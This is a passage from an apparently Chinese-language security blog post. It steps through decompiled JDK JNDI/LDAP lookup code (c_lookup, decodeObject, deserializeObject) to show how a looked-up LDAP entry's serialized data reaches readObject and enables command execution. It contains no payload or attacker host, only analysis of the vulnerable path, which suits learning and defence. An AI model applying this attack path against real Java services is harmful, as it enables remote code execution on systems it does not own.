    Continuation var4 = new Continuation(var1, var3);
    Name var6 = var1;

    Object var5;
    try {
        for(var5 = var2.p_lookup(var6, var4); var4.isContinue(); var5 = var2.p_lookup(var6, var4)) {
            var6 = var4.getRemainingName();
            var2 = getPCContext(var4);
        }
    } catch (CannotProceedException var9) {
        Context var8 = NamingManager.getContinuationContext(var9);
        var5 = var8.lookup(var9.getRemainingName());
    }

    return var5;
}
```

进入`p_lookup`

```java
protected Object p_lookup(Name var1, Continuation var2) throws NamingException {
    Object var3 = null;
    HeadTail var4 = this.p_resolveIntermediate(var1, var2);
    switch (var4.getStatus()) {
        case 2:
🔴          var3 = this.c_lookup(var4.getHead(), var2);
            if (var3 instanceof LinkRef) {
                var2.setContinue(var3, var4.getHead(), this);
                var3 = null;
            }
            break;
        case 3:
            var3 = this.c_lookup_nns(var4.getHead(), var2);
            if (var3 instanceof LinkRef) {
                var2.setContinue(var3, var4.getHead(), this);
                var3 = null;
            }
    }
    return var3;
}
```

又进入了一个`c_lookup`,这里终于看到`decodeObject`了,因为这里我们用的是LDAP，所以会走到LDAP的`decodeObject`里

```java
protected Object c_lookup(Name var1, Continuation var2) throws NamingException {
var2.setError(this, var1);
Object var3 = null;

Object var4;
try {
    SearchControls var22 = new SearchControls();
    var22.setSearchScope(0);
    var22.setReturningAttributes((String[])null);
    var22.setReturningObjFlag(true);
    LdapResult var23 = this.doSearchOnce(var1, "(objectClass=*)", var22, true);
    this.respCtls = var23.resControls;
    if (var23.status != 0) {
        this.processReturnCode(var23, var1);
    }

    if (var23.entries != null && var23.entries.size() == 1) {
        LdapEntry var25 = (LdapEntry)var23.entries.elementAt(0);
        var4 = var25.attributes;
        Vector var8 = var25.respCtls;
        if (var8 != null) {
            appendVector(this.respCtls, var8);
        }
    } else {
        var4 = new BasicAttributes(true);
    }

    if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
🔴      var3 = Obj.decodeObject((Attributes)var4);
    }

    if (var3 == null) {
        var3 = new LdapCtx(this, this.fullyQualifiedName(var1));
    }
} catch (LdapReferralException var20) {
    LdapReferralException var5 = var20;
    if (this.handleReferrals == 2) {
        throw var2.fillInException(var20);
    }

    while(true) {
        LdapReferralContext var6 = (LdapReferralContext)var5.getReferralContext(this.envprops, this.bindCtls);

        try {
            Object var7 = var6.lookup(var1);
            return var7;
        } catch (LdapReferralException var18) {
            var5 = var18;
        } finally {
            var6.close();
        }
    }
} catch (NamingException var21) {
    throw var2.fillInException(var21);
}

try {
    return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
} catch (NamingException var16) {
    throw var2.fillInException(var16);
} catch (Exception var17) {
    NamingException var24 = new NamingException("problem generating object using object factory");
    var24.setRootCause(var17);
    throw var2.fillInException(var24);
}
}

```

进入`decodeObject`,这里有个`getURLClassLoader`

```java
static Object decodeObject(Attributes var0) throws NamingException {
    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));

    try {
        Attribute var1;
        if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
🔴          ClassLoader var3 = helper.getURLClassLoader(var2);
🔴          return deserializeObject((byte[])var1.get(), var3);
        } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
            return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
        } else {
            var1 = var0.get(JAVA_ATTRIBUTES[0]);
            return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
        }
    } catch (IOException var5) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var5);
        throw var4;
    }
}
```

`getURLClassLoader`这里会进行`trustURLCodebase`的判断，

```java
ClassLoader getURLClassLoader(String[] var1) throws MalformedURLException {
    ClassLoader var2 = this.getContextClassLoader();
    return (ClassLoader)(var1 != null && "true".equalsIgnoreCase(trustURLCodebase) ? URLClassLoader.newInstance(getUrlArray(var1), var2) : var2);
}
```

这里实例化不通过是不会加载字节码进行命令执行的，我们继续往下走，有一个 `deserializeObject()` 方法非常引人注目(紧跟getURLClassLoader后的红色断点)，根据意思，它一定是一个用来反序列化的方法。再查看一下这里被反序列化的东西，是一个 `javaSerializedData` 数据类型的类。

跟进这个方法，遇到了 `readObject()` 方法,读取的字节码被反序列化出来的时候，字节码被加载，造成命令执行

```java
private static Object deserializeObject(byte[] var0, ClassLoader var1) throws NamingException {
    try {
        ByteArrayInputStream var2 = new ByteArrayInputStream(var0);

        try (Object var20 = var1 == null ? new ObjectInputStream(var2) : new LoaderInputStream(var2, var1)) {
🔴          Object var5 = ((ObjectInputStream)var20).readObject();
            return var5;
        } catch (ClassNotFoundException var18) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var18);
            throw var4;
        }
    } catch (IOException var19) {
        NamingException var3 = new NamingException();
        var3.setRootCause(var19);
        throw var3;
    }
}
```

### 参考

部分内容参考自NepNep小叮师傅:https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#0x02-JNDI-%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%8C%E4%BB%A3%E7%A0%81%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E
